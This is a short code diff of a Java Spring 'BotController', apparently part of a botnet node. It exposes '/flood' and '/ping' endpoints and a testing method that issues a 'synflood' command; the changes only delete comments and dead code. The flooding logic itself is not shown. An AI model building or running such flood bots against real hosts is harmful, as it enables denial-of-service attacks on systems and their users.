@@ -48,11 +48,6 @@ public class BotController {
 	@Autowired
 	NetworkService nServ;
 
-//	@RequestMapping("/")
-//	public String index() {
-//		return "BOT OPERATIVO";
-//	}
-
 	@RequestMapping(value = "/flood", method = RequestMethod.POST)
 	public Boolean msgFlood(@RequestBody String msg, HttpServletRequest req) {
 
@@ -112,7 +107,6 @@ public class BotController {
 	
 	@RequestMapping(value = "/ping", method = RequestMethod.POST)
 	public Boolean ping(HttpServletRequest req) {
-		//Valutare se eliminare auto-ping
 		return true;
 	}
 
@@ -122,14 +116,8 @@ public class BotController {
 	
 	@RequestMapping("/testing")
 	public Boolean testing() {
-
-		// per efficienza chiamo un metodo asincrono e rispondo che ho ricevuto
-		// il msg
-		// tutto il resto avviene nella in Flood&Execute
-
 		String cmd = "synflood";
 		String msg = "";
-		// aggiungi nonce time.millis
 		Long milli = System.currentTimeMillis();
 
 		Random rand = new SecureRandom(milli.toString().getBytes());
